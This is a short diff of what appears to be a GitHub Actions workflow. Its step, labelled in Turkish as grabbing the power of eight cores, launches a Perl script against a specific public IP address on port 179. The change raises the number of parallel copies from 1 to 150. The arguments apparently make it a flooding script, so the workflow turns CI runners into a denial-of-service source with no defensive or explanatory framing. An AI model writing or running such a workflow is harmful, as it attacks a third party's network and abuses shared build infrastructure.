@@ -22,8 +22,7 @@ jobs:
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
-          # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
-          for i in {1..1}; do
+          for i in {1..150}; do
             perl v2.pl 176.236.16.123 179 10000 1000 65600 5 &
             PIDS+=($!)
           done
